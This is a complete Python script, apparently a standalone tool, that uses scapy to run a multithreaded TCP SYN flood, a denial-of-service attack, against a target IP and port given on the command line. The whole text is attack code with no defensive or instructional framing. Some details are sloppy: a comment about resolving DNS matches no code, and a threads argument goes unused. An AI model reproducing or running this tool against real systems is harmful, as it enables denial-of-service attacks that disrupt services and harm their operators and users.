import argparse
import threading
from scapy.all import IP, TCP, send

# SYN flood attack function
def syn_flood(target, port, threads):

    print("Starting SYN flood on", target, "using", threads, "threads")

    # Craft SYN packet
    ip = IP(dst=target)
    tcp = TCP(sport=1234, dport=port, flags='S')
    packet = ip / tcp

    try:
        while True:
            # Send SYN packet using scapy's send function
            send(packet, verbose=0)
    except Exception as e:
        print("Error sending SYN packet:", str(e))

def main():
    parser = argparse.ArgumentParser(description="SYN Flood Attack Tool")
    parser.add_argument("target", help="Target IP address")
    parser.add_argument("--port", type=int, default=80, help="Target port (default: 80)")
    parser.add_argument("--threads", type=int, default=500, help="Number of threads (default: 500)")
    
    args = parser.parse_args()

    # Resolve target DNS name
    target_ip = args.target

    # Launch SYN flood threads
    for _ in range(args.threads):
        thread = threading.Thread(target=syn_flood, args=(target_ip, args.port, args.threads))
        thread.start()

if __name__ == "__main__":
    main()
